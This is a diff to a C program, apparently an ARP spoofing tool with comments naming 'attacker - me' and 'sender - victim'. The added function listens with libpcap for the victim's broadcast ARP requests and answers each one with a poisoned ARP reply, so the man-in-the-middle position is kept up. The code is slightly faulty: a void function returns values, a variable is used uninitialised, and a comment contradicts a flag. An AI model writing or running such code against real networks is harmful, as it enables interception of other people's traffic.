@@ -323,6 +323,64 @@ int relay_packet(u_char *dev, struct host_info *my, struct host_info *tar)
 	return 1;
 }
 
+
+/* Observe sdr */
+void recover_pkt_detact(u_char *dev, struct host_info *my, struct host_info *sdr, struct host_info *tar)
+{
+	pcap_t *handle;			/* Session handle */
+	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
+	struct bpf_program fp;		/* The compiled filter */
+	struct pcap_pkthdr *header;	/* The header that pcap gives us */
+	bpf_u_int32 net;		/* Our IP */
+	char filter_exp[] = "arp";	/* The filter expression */
+	unsigned char *packet;		/* Buffer to recv */
+	struct ethhdr *recv_ether;
+	struct arphdr *recv_arp;
+	uint32_t res;
+	uint32_t i;
+
+
+	/* Open the session in promiscuous mode */
+	handle = pcap_open_live(dev, 65536, 0, 1, errbuf);
+	if (handle == NULL) {
+		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+		return(0);
+	}
+
+	/* Compile and apply the filter */
+	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
+		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(0);
+	}
+	if (pcap_setfilter(handle, &fp) == -1) {
+		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
+		return(0);
+	}
+
+
+	while(1) {
+		res = pcap_next_ex(handle, &header, (const u_char**)&packet);
+		if (res==0)
+			continue;
+		else if (res==-1)
+		{
+			fprintf(stderr, "Couldn't recv packet\n");
+			return 0;
+		}
+
+		recv_ether = (struct ethhdr*)packet;
+		if (recv_ether->h_proto == ETHERTYPE_ARP)
+		{
+			recv_arp = (struct arphdr*)(packet + 14);
+			if (recv_arp->opcode == ARP_REQUEST)
+				if (*(uint32_t*)recv_arp->sdr_ip == *(uint32_t*)sdr->ip)
+					if (!memcmp(recv_ether->h_dest, "\xff\xff\xff\xff\xff\xff", 6))
+						Send_poisoned_arp(dev, my, sdr, tar);
+		}
+	}
+	return 1;
+}
+
 /*
 * attacker	- me
 * sender 	- victim
